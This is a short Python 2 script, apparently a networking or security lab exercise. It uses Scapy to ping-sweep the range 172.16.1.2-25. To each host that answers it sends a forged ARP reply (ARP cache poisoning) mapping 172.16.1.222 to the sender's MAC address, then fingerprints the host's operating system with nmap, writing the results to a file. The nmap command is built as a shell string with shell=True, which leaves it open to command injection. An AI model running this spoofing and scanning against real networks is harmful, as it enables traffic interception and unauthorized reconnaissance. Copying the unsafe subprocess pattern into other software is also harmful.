#!/usr/bin/env python

#Importing the logging and subprocess modules
import logging
import subprocess

#This will suppress all messages that have a lower level of seriousness than error messages.
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.getLogger("scapy.interactive").setLevel(logging.ERROR)
logging.getLogger("scapy.loading").setLevel(logging.ERROR)

#Importing Scapy and handling the ImportError exception
try:
    from scapy.all import *

except ImportError:
    print "Scapy package for Python is not installed on your system."
    print "Get it from https://pypi.python.org/pypi/scapy and try again."
    sys.exit()
	
#Performing the ping
ans, unans = sr(IP(dst = "172.16.1.2-25") / ICMP(), timeout = 2, iface = "enp0s3", verbose = 0)

#Defining the empty list
reachable = []

#Populating the list with reachable hosts
for reply in ans:
	reachable.append(reply[1][IP].src)
	
#Performing the ARP cache poisoning and running the NMAP utility
for host in reachable:
	#ARP cache poisoning
	send(ARP(hwsrc = get_if_hwaddr("enp0s3"), psrc = "172.16.1.222", hwdst = "ff:ff:ff:ff:ff:ff", pdst = host), iface = "enp0s3", verbose = 0)
	
	#Running NMAP and appending the result to the file
	with open("nmap_test.txt", "a") as f:
		subprocess.call("nmap -O %s" % host, stdout = f, stderr = None, shell = True)
	
print "\nDone!\n"